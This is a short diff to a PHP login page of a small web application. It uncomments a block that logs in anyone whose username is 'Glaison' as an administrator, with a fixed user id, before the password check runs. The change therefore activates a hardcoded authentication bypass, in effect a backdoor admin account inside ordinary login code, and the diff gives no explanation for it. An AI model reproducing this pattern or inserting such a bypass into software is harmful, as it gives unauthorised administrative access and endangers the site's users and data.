@@ -17,14 +17,14 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET') {
         die("Erro ao Executar Sql !!" . $conection->connect_error);
     }
     $c_linha = $result->fetch_assoc();
-    //if ($c_login == 'Glaison') {
-    //    $_SESSION["newsession"] = "gop";
-    //    $_SESSION["id_usuario"] = 16;
-    //    
-    //    $_SESSION['c_usuario'] = $c_login;
-    //    $_SESSION['tipo'] = 'Administrador';
-    //    header('location: /gop/menu.php');
-   // }
+    if ($c_login == 'Glaison') {
+        $_SESSION["newsession"] = "gop";
+        $_SESSION["id_usuario"] = 16;
+        
+        $_SESSION['c_usuario'] = $c_login;
+        $_SESSION['tipo'] = 'Administrador';
+        header('location: /gop/menu.php');
+    }
     if ($c_linha['achou'] == 0) {
         $l_erro = 'Falha no Login. Nome ou senha inválido. Verifique os dados e tente novamente !!!';
     } else {
